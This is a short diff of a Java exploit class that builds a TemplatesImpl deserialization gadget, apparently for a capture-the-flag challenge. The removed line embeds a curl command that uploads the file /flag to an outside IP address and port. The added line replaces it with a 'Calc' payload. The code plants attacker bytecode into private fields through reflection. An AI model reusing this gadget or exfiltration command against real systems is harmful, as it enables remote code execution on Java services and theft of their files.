@@ -49,7 +49,7 @@ public class test {
     }
     public static void main(String[] args) throws Exception{
         TemplatesImpl obj = new TemplatesImpl();
-        byte[] code = getTemplatesImpl("curl -F xx=@/flag 120.79.0.164:1236");
+        byte[] code = getTemplatesImpl("Calc");
         byte[][] bytecodes = {code};
         setFieldValue(obj, "_bytecodes", bytecodes);
         setFieldValue(obj, "_name", "Poria");
